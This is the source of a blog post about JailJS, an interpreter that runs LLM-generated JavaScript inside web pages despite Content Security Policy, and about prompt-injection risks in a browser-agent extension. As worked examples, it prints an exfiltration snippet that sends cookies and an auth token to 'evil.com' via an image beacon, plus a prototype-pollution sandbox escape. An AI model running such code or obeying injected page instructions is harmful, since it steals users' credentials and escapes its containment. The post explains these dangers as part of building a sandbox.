<%
	meta("../../meta.json")
	meta()
	const path = require('path');
	url = url + "/posts/" + path.basename(path.dirname(outputPath)) + "/";
%>
<%= render("../../_partials/post-header.html", { title, image, url }) %>

<h1 class="toc-header">Table of contents</h1>
<div class="toc">
%%toc%%
</div>

Thursday I had a wisdom tooth extraction and I still feel unwell. Thank you for asking. Before this unfortunate event, I worked on a little browser extension that lets me navigate the web in the browser together with an LLM, which is hosted in the browser extension's side panel. Here you can see it in action. Check out the rest of my YouTube channel, there are more demonstrations there.

<iframe src="https://www.youtube.com/embed/kc8YL3P4LUc" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen style="width: 100%; aspect-ratio: 16/9; margin: 0 auto 1.5rem auto; display: block; border-radius: 8px; border: 1px solid var(--border-color);"></iframe>

The LLM has a tool that can inject any sort of JavaScript into the active page to get its contents, manipulate it, click on buttons, and so on and so forth. One nice use case, for example, is to let it use Google directly instead of something like <a href="https://exa.ai/">Exa</a>, navigate the web, and collect information for me, then spit it out as a nicely formatted markdown file. Not only do I get the markdown file, but I also have full observability of what exactly it read and can follow its traces in the browser history.

## I got 99 problems but... now I got even more

Now the problem with this is that the LLM can write any old code that gets executed in the current page's JavaScript context. This implies that it has full access to anything on that page, not only the DOM, but also local storage, non-HTTP only cookies, IndexedDB, and other possibly sensitive information. Exfiltrating that data to an adversary is only a fetch call or an image with a source attribute away. So why would it do that? I surely wouldn't instruct my LLM to send my sensitive data to an adversary.

Well, LLMs can get <a href="https://simonwillison.net/2023/Apr/14/worst-that-can-happen/">prompt injected</a>, and it's easier than you think. It still affects all <a href="https://www.anthropic.com/news/claude-for-chrome">current SOTA LLMs</a>. As you navigate the web with your trusty LLM, you might visit a page with some invisible content that instructs the LLM to exfiltrate data the next time you visit your bank or social media account. And if you are not observing what your LLM is doing, your data might get stolen.

That's one problem. The other problem is that there is something called <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP">Content Security Policy</a>, which you might have heard of if you've ever worked with web technologies. CSP lets sites define what sources JavaScript can execute from, whether inline scripts or eval are allowed, and which URLs external scripts can be loaded from. And CSP can prevent my browser extension from injecting the LLM generated code into the site. It's a pretty common practice, especially among bigger sites like social media sites, search engine sites, and so on.

Using the Chrome extension API as an example, here's how we can run a function defined inside of our extension in the currently active tab:

```javascript
// Browser extension code
function myPredefinedFunction() {
    return document.title;
}

const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: myPredefinedFunction
});
```

This actually works on any site, irrespective of its CSP. The reason for that is that the function is statically defined in the extension, and it is serializable. That means it has no external dependencies on other functions in the extension or third-party code imported from modules.

So far so good, but this only handles functions defined statically in our extension. How about arbitrary code that gets generated at runtime by a user, like in <a href="https://www.tampermonkey.net/">Tampermonkey</a>, or by an LLM, like in my extension above? Here's how that could look like:

```javascript
// Using eval
const userCode = `console.log(document.title)`;
chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: (code) => eval(code),
    args: [userCode]
});

// Using new Function
chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: (code) => new Function(code)(),
    args: [userCode]
});

// Injecting a script tag
chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: (code) => {
        const script = document.createElement('script');
        script.textContent = code;
        document.body.appendChild(script);
    },
    args: [userCode]
});
```

These can work depending on the CSP of the site, but as I said, on bigger sites, these are usually super not allowed. So how can we make this work?

## A matter of interpretation

So how can we make code dynamically defined at runtime by a user or an LLM statically defined? Well, we really can't. But what we can statically define is a parser and interpreter that takes that string of code and interprets it. If you want to learn more about interpreters, I suggest reading Bob Nystrom's <a href="https://craftinginterpreters.com/">Crafting Interpreters</a>. It's an especially accessible book on the matter of parsing, compilation, and interpretation, especially compared to the books that I learned from, like the Dragon Book.

We can define a simple interface for our interpreter that looks like this:

```javascript
import { Interpreter, parse } from '@mariozechner/jailjs';

const ast = parse('2 + 2');
const interpreter = new Interpreter();
const result = interpreter.evaluate(ast);
```

Let's totally ignore what `parse` and `interpreter.evaluate` do on the inside. All we need to know at this stage is that `parse` returns an <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">abstract syntax tree</a>. That is the input to the interpreter, which then walks this tree structure and evaluates each node within it, simulating what the JavaScript engine would do, just in a very, very slow way. In the above example, `result` would be assigned the number four, which is the evaluation result of the JavaScript code.

So how can we jam the parser and interpreter into a self-contained function that we can execute via `chrome.scripting.executeScript` in the active tab's JavaScript context?

The trick is to use a content script. Content scripts are JavaScript files that run in the context of web pages, and they can be bundled with all their dependencies using a tool like esbuild. We bundle the parser and interpreter into our content script, which gets loaded for every page. The content script then sets up a message listener that receives code to execute and returns the result.

Here's the minimal setup:

```javascript
// content.js - bundled with parser and interpreter
import { Interpreter, parse } from '@mariozechner/jailjs';

const interpreter = new Interpreter();

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === 'EXECUTE_CODE') {
        try {
            const ast = parse(message.code);
            const result = interpreter.evaluate(ast);
            sendResponse({ success: true, result });
        } catch (error) {
            sendResponse({ success: false, error: error.message });
        }
    }
    return true; // Keep channel open for async response
});
```

And from our extension's side panel or popup, we send the code:

```javascript
// Send code to content script
const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
const response = await chrome.tabs.sendMessage(tab.id, {
    type: 'EXECUTE_CODE',
    code: userCode
});

if (response.success) {
    console.log('Result:', response.result);
}
```

And that's the basic setup. The content.js file is all static, the interpreter is all static and known ahead of time. But it lets us execute arbitrary code, albeit slowly, irrespective of the site's CSP. We are not using eval, new Function, or a script tag.

Congratulations us, we just broke the web.

## Nitty gritty details

Alright, let's look inside `parse` and the interpreter. Starting with parsing, while I am a madman, I'm not mad enough to write a JavaScript parser. Instead, I'm using the marvelous work of the <a href="https://babeljs.io/">Babel</a> team, who have graciously created a wonderful little standalone package, <a href="https://babeljs.io/docs/babel-standalone">Babel standalone</a>, which makes parsing JavaScript into a well-defined abstract syntax tree easy as pie.

Here's what the AST for a simple program looks like:

```javascript
var x = 5;
var y = 10;
x + y
```

```json
[
  {
    "type": "VariableDeclaration",
    "kind": "var",
    "id": "x",
    "init": { "type": "NumericLiteral", "value": 5 }
  },
  {
    "type": "VariableDeclaration",
    "kind": "var",
    "id": "y",
    "init": { "type": "NumericLiteral", "value": 10 }
  },
  {
    "type": "ExpressionStatement",
    "expression": {
      "type": "BinaryExpression",
      "left": { "type": "Identifier", "name": "x" },
      "operator": "+",
      "right": { "type": "Identifier", "name": "y" }
    }
  }
]
```

The AST consists of nodes where each node represents a language concept like a variable declaration, a binary expression like an addition, numeric literals, identifiers, function calls, and so on. How do we know which AST node types are available? Well, that depends on the flavor of JavaScript we are trying to compile. The most basic standardized version of JavaScript is ECMAScript 5 from 2009, which is still widely used as a baseline.

The wonderful people of the <a href="https://github.com/estree/estree/blob/master/es5.md">ESTree project</a> have documented which AST nodes we can expect for ES5. So to build an interpreter, all that's left is to have a big fat switch statement that interprets, that is, executes each type of AST node recursively.

Here's a simplified version of what that looks like:

```javascript
function evaluate(node, scope) {
    switch (node.type) {
        case "NumericLiteral":
            return node.value;

        case "Identifier":
            return scope.getVariable(node.name);

        case "BinaryExpression":
            const left = evaluate(node.left, scope);
            const right = evaluate(node.right, scope);
            switch (node.operator) {
                case "+": return left + right;
                case "-": return left - right;
                case "*": return left * right;
                case "/": return left / right;
                // ... more operators
            }

        case "VariableDeclaration":
            for (const decl of node.declarations) {
                const value = decl.init ? evaluate(decl.init, scope) : undefined;
                scope.declareVariable(decl.id.name, value);
            }
            return undefined;

        // ... 50+ more cases for all ES5 features
    }
}
```

The `scope` parameter keeps track of variables and their values. Each function creates a new scope that can access variables from its parent scope, forming a chain. When you look up a variable, you start in the current scope and walk up the chain to the global scope. If you can't find it, you throw an error that the variable is undefined.

Now, again, I suggest reading Bob's book. And if you're brave, you can look at the <a href="https://github.com/badlogic/jailjs/blob/main/src/interpreter.ts">actual interpreter code</a> that powers JailJS (the little interpreter project this blog post is actually about). As you can see, it's a little bit more involved than the above examples make it out to be, but it's also not rocket science.

The interpreter actually handles all of the ES5 spec. Through the power of Babel's transpiler, we can also take ES6+ or even TypeScript or JSX code and have it compiled down to ES5 so our interpreter can run that too. That means we can also use async/await, classes, and other ES6+ features. That said, in its current iteration, the interpreter cannot deal with some more advanced ES6+ features like generators, ES6 modules, Proxies, Reflect, WeakRef, SharedArrayBuffer, or Atomics.

But wait, wasn't this supposed to be kind of like a sandbox from which the LLM shouldn't be able to escape like a demented Houdini?

## Putting the sand in the sandbox

The key to sandboxing is controlling what the interpreted code has access to. Remember that `scope` parameter we pass to the interpreter? We can populate it with exactly the APIs we want the code to have access to, and nothing more. The code being interpreted can't reach out into the surrounding JavaScript execution environment and access things we didn't explicitly provide. Well, at least that's the theory.

By default, JailJS provides a minimal set of globals: `console`, `Math`, `JSON`, `Date`, `RegExp`, basic constructors like `Array` and `Object`, error types, and global functions like `parseInt` and `parseFloat`. Notably absent are `window`, `document`, `fetch`, and other browser APIs. And critically, `Function` and `eval` are blocked to prevent the code from breaking out of the sandbox.

But we can inject additional APIs as needed. For example, in the extension use case, we can inject `document` so the LLM-generated code can interact with the DOM, like reading DOM contents, clicking buttons, or modifying DOM elements:

```javascript
const interpreter = new Interpreter({
    document: document,
    console: console
});
```

Astute readers will immediately see the problem with that. Let me illustrate what a prompt-injected LLM could generate:

```javascript
// Code to be interpreted - exfiltrates sensitive data
var cookies = document.cookie;
var win = document.defaultView;
var localStorage = win.localStorage.getItem('auth_token');

// Send to evil server via image beacon
var img = document.createElement('img');
img.src = 'https://evil.com/steal?data=' + encodeURIComponent(cookies + '|' + localStorage);
document.body.appendChild(img);
```

Now we can play a cat and mouse game and try to expose `document` while preventing access to specific properties on it, like `defaultView` which gives access to the global `window` object, which in turn gives access to local storage and cookies:

```javascript
const proxiedDoc = new Proxy(document, {
    get(target, prop) {
        if (prop === 'defaultView' || prop === 'ownerDocument') {
            return undefined;
        }
        const value = target[prop];
        return typeof value === 'function' ? value.bind(target) : value;
    }
});

const interpreter = new Interpreter({
    document: proxiedDoc
});
```

But ultimately, this is a Sisyphean task, and we are bound to fail gloriously. There's basically an infinite amount of attack vectors we would need to patch, which is really fucking hard.

The alternative is to not expose native objects like `document` directly, but instead expose custom-defined functions for specific tasks. For example, instead of giving full DOM access, we could provide:

```javascript
const interpreter = new Interpreter({
    // Safe, limited API
    getPageText: () => document.body.innerText,
    findButtons: () => Array.from(document.querySelectorAll('button')).map(b => b.innerText),
    clickButton: (text) => {
        const btn = Array.from(document.querySelectorAll('button'))
            .find(b => b.innerText === text);
        if (btn) btn.click();
    },
    fillInput: (selector, value) => {
        const input = document.querySelector(selector);
        if (input) input.value = value;
    }
});
```

The downside to this is that you still have to be very mindful of what you expose in your custom API. And in the LLM use case, you have to explicitly teach the LLM about your custom API. This may not work as well as the LLM just calling into DOM APIs, which it knows about from its vast training set.

That leaves us with ways to escape the interpreter and access the surrounding JavaScript execution environment through things like prototype pollution. For example:

```javascript
// Code to be interpreted - pollutes Array prototype to escape
Array.prototype.push = function() {
    // Now we have access to 'this' which is a real Array
    // We can walk up to get the global scope (if CSP allows eval)
    return this.constructor.constructor('return this')();
};

var arr = [];
arr.push(); // Returns window/globalThis
```

JailJS, my little JavaScript interpreter library, does prevent this specific case and others. But as I said, there's a million attack vectors and it's very, very hard to enumerate all of them while keeping the full ES5 feature set. <a href="https://github.com/nyariv/SandboxJS">SandboxJS</a> has a stricter approach to securing the sandbox and could be a good alternative. However, there are some <a href="https://github.com/nyariv/SandboxJS/issues/27">deal-breaking bugs</a>. Maybe I can steal their sandbox technology.

## JailJS: It just works (mostly)

<a href="https://github.com/badlogic/jailjs">JailJS</a> is my contribution to a less safe world. Here is <a href="https://github.com/badlogic/jailjs/tree/main/example/chrome-extension">JailJS used by a demo browser extension</a> to manipulate the site that shall not be named, which has a very strict CSP.

<video src="media/demo.mp4" controls loading="lazy">
</video>

It does succeed in solving my first problem, that is executing arbitrary code injected from an extension into a page with a CSP that disallows eval or script tags. Where it does fail is that it cannot 100% rule out that the arbitrary code can escape the sandbox and exfiltrate sensitive data.

You win some, you lose some.

<%= render("../../_partials/post-footer.html", { title, url }) %>
